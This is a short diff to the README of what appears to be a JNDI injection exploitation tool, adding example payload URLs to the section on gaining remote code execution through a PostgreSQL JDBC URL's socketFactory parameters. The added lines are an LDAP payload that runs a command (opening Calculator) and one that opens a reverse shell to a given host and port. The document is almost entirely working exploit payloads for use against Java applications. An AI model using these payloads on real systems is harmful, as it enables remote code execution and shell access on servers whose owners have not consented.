@@ -244,7 +244,11 @@ The above two methods require a malicious MySQL server to be used
 Instantiate ClassPathXmlApplicationContext via the socketFactory and socketFactoryArg parameters of the PostgreSQL JDBC URL to achieve RCE
 
 ```bash
+# command execution
 ldap://127.0.0.1:1389/Factory/PostgreSQL/Command/open -a Calculator
+
+# native reverse shell
+ldap://127.0.0.1:1389/Factory/PostgreSQL/ReverseShell/127.0.0.1/4444
 ````
 
 #### H2
